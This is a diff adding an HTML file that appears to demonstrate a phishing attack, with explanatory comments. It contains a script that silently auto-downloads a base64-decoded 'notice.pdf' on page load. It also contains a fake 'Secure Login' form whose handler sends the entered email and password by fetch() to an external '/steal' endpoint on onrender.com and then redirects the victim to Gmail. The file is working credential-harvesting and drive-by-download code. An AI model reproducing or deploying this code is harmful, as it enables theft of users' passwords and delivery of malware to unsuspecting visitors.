@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <!-- 1. FAKE BASE64 PAYLOAD (Harmless PDF, but in real attacks could be malware) -->
+  <script>
+    var data = "JVBERi0xLjQKJcTl8uXrp...";  
+    // atob(): decode base64 to binary string
+
+    var binary = atob(data);  
+    // Create a byte array from the binary string
+    var bytes = new Uint8Array(binary.length);
+    for (var i = 0; i < binary.length; i++) {
+      bytes[i] = binary.charCodeAt(i);
+    }
+
+    // Wrap bytes in a Blob (acts like a file in memory)
+    var blob = new Blob([bytes], { type: "application/pdf" });
+
+    // Generate a temporary blob URL
+    var url = URL.createObjectURL(blob);
+
+    // Trigger download of the “PDF” without user noticing
+    var a = document.createElement("a");
+    a.href = url;
+    a.download = "notice.pdf";
+    document.body.appendChild(a);
+    a.click();
+
+    // Optional: revoke the URL to free memory
+    URL.revokeObjectURL(url);
+  </script>
+
+  <!-- 2. BOGUS LOGIN FORM -->
+  <h2>Secure Login</h2>
+  <form id="loginForm">
+    <input id="email" type="email" placeholder="email"><br>
+    <input id="password" type="password" placeholder="password"><br>
+    <button type="submit">Login</button>
+  </form>
+
+  <!-- 3. STEAL & EXFILTRATE VIA Fetch API -->
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault(); // Stop normal form submission
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+
+      // Send stolen creds to attacker’s server
+      fetch("https://phishing-41z1.onrender.com/steal", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: email, password: password })
+      });
+      
+      // (Optional) Redirect to a “real” site or show error
+      window.location.href = "https://mail.google.com/";
+    });
+  </script>
+</body>
+</html>
